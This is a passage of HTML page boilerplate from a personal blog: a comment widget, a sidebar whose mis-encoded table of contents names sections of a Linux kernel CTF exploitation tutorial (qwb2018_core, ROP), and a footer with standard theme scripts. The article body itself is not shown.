            enableHotKey: true,
            
        })
        gitalk.render('comment-container')</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/MyLogo.jpg" alt="Humoooor"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Humoooor</p><p class="is-size-6 is-block">Free to Hack</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/humoooor" target="_blank" rel="noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/humoooor"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Email" href="mailto:humoooor@qq.com"><i class="fa fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">ç›®å½•</h3><ul class="menu-list"><li><a class="level is-mobile" href="#ç¯å¢ƒæ­å»º"><span class="level-left"><span class="level-item">1</span><span class="level-item">ç¯å¢ƒæ­å»º</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#å®‰è£…ä¸€äº›ä¾èµ–åŒ…"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">å®‰è£…ä¸€äº›ä¾èµ–åŒ…</span></span></a></li><li><a class="level is-mobile" href="#è·å–å†…æ ¸é•œåƒ"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">è·å–å†…æ ¸é•œåƒ</span></span></a></li><li><a class="level is-mobile" href="#ä½¿ç”¨-Busybox-æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">ä½¿ç”¨ Busybox æ„å»ºæ–‡ä»¶ç³»ç»Ÿ</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ç¼–è¯‘-Busybox"><span class="level-left"><span class="level-item">1.3.1</span><span class="level-item">ç¼–è¯‘ Busybox</span></span></a></li><li><a class="level is-mobile" href="#æ„å»ºæ–‡ä»¶ç³»ç»Ÿ"><span class="level-left"><span class="level-item">1.3.2</span><span class="level-item">æ„å»ºæ–‡ä»¶ç³»ç»Ÿ</span></span></a></li><li><a class="level is-mobile" href="#æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶"><span class="level-left"><span class="level-item">1.3.3</span><span class="level-item">æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿä¸ºé•œåƒæ–‡ä»¶</span></span></a></li><li><a class="level is-mobile" href="#åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶"><span class="level-left"><span class="level-item">1.3.4</span><span class="level-item">åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ·»åŠ æˆ–ä¿®æ”¹æ–‡ä»¶</span></span></a></li></ul></li><li><a class="level is-mobile" href="#ä½¿ç”¨-qemu-è¿è¡Œå†…æ ¸"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">ä½¿ç”¨ qemu è¿è¡Œå†…æ ¸</span></span></a></li></ul></li><li><a class="level is-mobile" href="#äº†è§£-LKM"><span class="level-left"><span class="level-item">2</span><span class="level-item">äº†è§£ LKM</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#é¢„å¤‡çŸ¥è¯†"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">é¢„å¤‡çŸ¥è¯†</span></span></a></li><li><a class="level is-mobile" href="#ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">ç¼–å†™ä¸€ä¸ªç®€å•æ¨¡å—</span></span></a></li><li><a class="level is-mobile" href="#ç¼–è¯‘-LKM"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">ç¼–è¯‘ LKM</span></span></a></li><li><a class="level is-mobile" href="#ä½¿ç”¨-LKM"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">ä½¿ç”¨ LKM</span></span></a></li></ul></li><li><a class="level is-mobile" href="#å…¥é—¨é¢˜-qwb2018-core"><span class="level-left"><span class="level-item">3</span><span class="level-item">å…¥é—¨é¢˜ qwb2018_core</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#æŸ¥çœ‹è„šæœ¬"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">æŸ¥çœ‹è„šæœ¬</span></span></a></li><li><a class="level is-mobile" href="#åˆ†æ-LKM"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">åˆ†æ LKM</span></span></a></li><li><a class="level is-mobile" href="#æ¼æ´åˆ©ç”¨-ROP"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">æ¼æ´åˆ©ç”¨ ROP</span></span></a></li><li><a class="level is-mobile" href="#exp"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">exp</span></span></a></li></ul></li><li><a class="level is-mobile" href="#å‚è€ƒé“¾æ¥"><span class="level-left"><span class="level-item">4</span><span class="level-item">å‚è€ƒé“¾æ¥</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">å½’æ¡£</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/"><span class="level-start"><span class="level-item">2024</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">æ ‡ç­¾</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/FILE/"><span class="tag">FILE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Kernel/"><span class="tag">Linux Kernel</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Memory-Management/"><span class="tag">Memory Management</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Musl-libc/"><span class="tag">Musl libc</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Operating-System/"><span class="tag">Operating System</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Qemu/"><span class="tag">Qemu</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RISC-V/"><span class="tag">RISC-V</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Rust/"><span class="tag">Rust</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Tools/"><span class="tag">Tools</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Xv6/"><span class="tag">Xv6</span><span class="tag">7</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/MyLogo.jpg" alt="Humoooor&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2024 Humoooor</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/humoooor"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="å›åˆ°é¡¶ç«¯" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "æ­¤ç½‘ç«™ä½¿ç”¨Cookieæ¥æ”¹å–„æ‚¨çš„ä½“éªŒã€‚",
          dismiss: "çŸ¥é“äº†ï¼",
          allow: "å…è®¸ä½¿ç”¨Cookie",
          deny: "æ‹’ç»",
          link: "äº†è§£æ›´å¤š",
          policy: "Cookieæ”¿ç­–",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..."></div><a class="searchbox-close" href="javascript:;">Ã—</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ...","untitled":"(æ— æ ‡é¢˜)","posts":"æ–‡ç« ","pages":"é¡µé¢","categories":"åˆ†ç±»","tags":"æ ‡ç­¾"});
        });</script></body></html>